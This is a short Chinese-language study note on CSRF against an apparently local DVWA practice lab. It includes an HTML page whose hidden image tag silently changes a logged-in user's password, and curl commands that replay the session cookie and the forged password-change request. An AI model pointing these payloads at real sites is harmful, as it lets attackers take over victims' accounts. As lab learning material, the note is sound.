# CSRF

### 成立條件至少有兩個:

1. 攻擊對象已經登入過原本的服務，在不需要重新驗證的情況下，從其他網域或地方也能存取服務
2. 服務本身有透過連結觸發某些能被你利用功能 (e.g 改密碼, 轉帳)

## GET

### by <img/> tag
假如使用者未登出服務，瀏覽器在別處載入此頁面時，他的密碼就會被改成 `1111`

```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>csrf by GET</title>
</head>
<body>
set password to: 1111
  <img 
    src="http://localhost:8086/vulnerabilities/csrf/?password_new=1111&password_conf=1111&Change=Change"
  >
</ body>
</html>
```

## cURL snippets

### curl 存取 cookie
因為 HTTP 是 stateless，所以要用 curl 模擬 user 行為 (持有 session id in cookie) 必須將 cookie 存在本地，下次使用時就可以直接讀取
```
curl -v -c cookies.txt -b cookies.txt host.com/registrations/register/
curl -v -c cookies.txt -b cookies.txt -d "email=user@site.com&a=1&csrfmiddlewaretoken=<token from cookies.txt>" host.com/registrations/register/
```
```
curl -v "http://localhost:8086" -c cookies.txt -b cookies.txt
```

### 試著用 curl 模擬 CSRF 的過程

登入
```
curl -v -L -c cookies.txt -b cookies.txt -X POST "http://localhost:8086/login.php" --data-raw 'username=admin&password=123&Login=Login&user_token=bc27fbf9cc617adb1c1b3f44f9fd1b62'
```

中招，被改密碼
```
curl -v -c cookies.txt -b cookies.txt "http://localhost:8086/vulnerabilities/csrf/?password_new=111&password_conf=111&Change=Change#"
```
